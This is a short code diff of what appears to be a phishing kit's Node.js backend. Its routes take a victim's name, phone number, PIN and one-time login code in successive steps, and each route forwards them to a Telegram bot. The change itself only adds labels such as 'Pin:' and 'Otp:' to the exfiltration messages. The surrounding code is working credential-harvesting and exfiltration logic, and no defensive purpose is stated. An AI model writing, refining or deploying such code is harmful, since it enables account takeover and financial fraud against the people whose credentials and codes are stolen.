@@ -92,8 +92,8 @@ app.post('/submit-password', async (req, res) => {
   await sendTelegram(
     bot,
 `📲 LOGIN STEP
-👤 ${name}
-📞 ${phone}
+👤Name: ${name}
+📞Phone: ${phone}
 🆔 ${requestId}`,
     [
       [
@@ -131,9 +131,9 @@ app.post('/submit-pin', async (req, res) => {
   await sendTelegram(
     bot,
 `🔐 PIN STEP
-👤 ${name}
-📞 ${phone}
-🔢 ${pin}
+👤Name: ${name}
+📞Phone: ${phone}
+🔢Pin: ${pin}
 🆔 ${requestId}`,
     [
       [
@@ -171,9 +171,9 @@ app.post('/submit-otp', async (req, res) => {
   await sendTelegram(
     bot,
 `🔢 CODE STEP
-👤 ${name}
-📞 ${phone}
-🔑 ${otp}
+👤Name: ${name}
+📞Phone: ${phone}
+🔑Otp: ${otp}
 🆔 ${requestId}`,
     [
       [
